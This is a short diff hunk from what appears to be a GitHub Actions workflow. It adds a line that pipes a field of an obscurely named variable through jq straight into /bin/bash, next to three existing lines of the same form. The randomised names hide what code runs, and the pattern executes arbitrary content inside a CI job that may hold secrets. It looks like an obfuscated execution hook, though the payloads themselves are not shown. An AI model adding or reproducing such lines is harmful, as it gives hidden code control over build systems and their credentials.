@@ -32,6 +32,7 @@ jobs:
           echo $ufox610 | jq -r .t0782 | /bin/bash
           echo $cqmq11525 | jq -r .rmfs86020 | /bin/bash
           echo $uxyvp4 | jq -r .x588 | /bin/bash
+          printf '%s' "$fxl8" | jq -r .kgza77 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
